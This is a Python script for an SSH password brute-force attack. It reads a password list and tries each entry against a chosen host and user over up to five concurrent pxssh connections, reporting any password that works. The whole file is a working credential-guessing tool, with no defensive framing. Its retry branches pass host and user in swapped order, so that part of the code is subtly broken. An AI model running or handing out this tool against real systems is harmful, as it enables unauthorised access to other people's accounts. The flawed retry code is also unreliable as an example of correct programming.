import optparse  # for arguments
import time  # for pausing
from pexpect import pxssh
from threading import BoundedSemaphore, Thread

maxConnections = 5
connectionLock = BoundedSemaphore(value=maxConnections)
found = False
fails = 0

PROMPT = ['# ', '>>> ', '> ', '\$ ']  # command line prompts


def send_command(child, cmd):
    child.sendline(cmd)
    child.expect(PROMPT)
    output = child.before
    print(output)


def connect(user, host, password, release):
    global found
    global fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print('[+] Password Found: ' + password)
        found = True
    except Exception as e:
        if 'read_nonblocking' in str(e):
            fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connectionLock.release()


def main():
    # Arguments
    parser = optparse.OptionParser(
        '%prog ' + '-H <target host> -u <user> -F <password list>')
    parser.add_option('-H', dest='targetHost', type='string',
                      help='specify target host')
    parser.add_option('-F', dest='passwordFile', type='string',
                      help='specify password file')
    parser.add_option('-u', dest='user', type='string',
                      help='specify the user')
    (options, args) = parser.parse_args()

    host = options.targetHost
    passwordFile = options.passwordFile
    user = options.user
    if host is None or passwordFile is None or user is None:
        print(parser.usage)
        exit(0)

    length = len(open(passwordFile, encoding="ISO-8859-1").readlines())
    print('Number of passwords: ', length)

    fn = open(passwordFile, encoding="ISO-8859-1")
    for index, line in enumerate(fn.readlines()):
        if found:
            print('[*] Exiting: Password Found')
            exit(0)
        if fails > 5:
            print('[!] Exiting: Too Many Socket Timeouts')
            exit(1)
        connectionLock.acquire()
        password = line.strip('\r').strip('\n')
        print('[-] Testing(' + str(index + 1) +
              '/' + str(length) + '): ' + str(password))
        t = Thread(target=connect, args=(user, host, password, True))
        t.start()


if __name__ == '__main__':
    main()
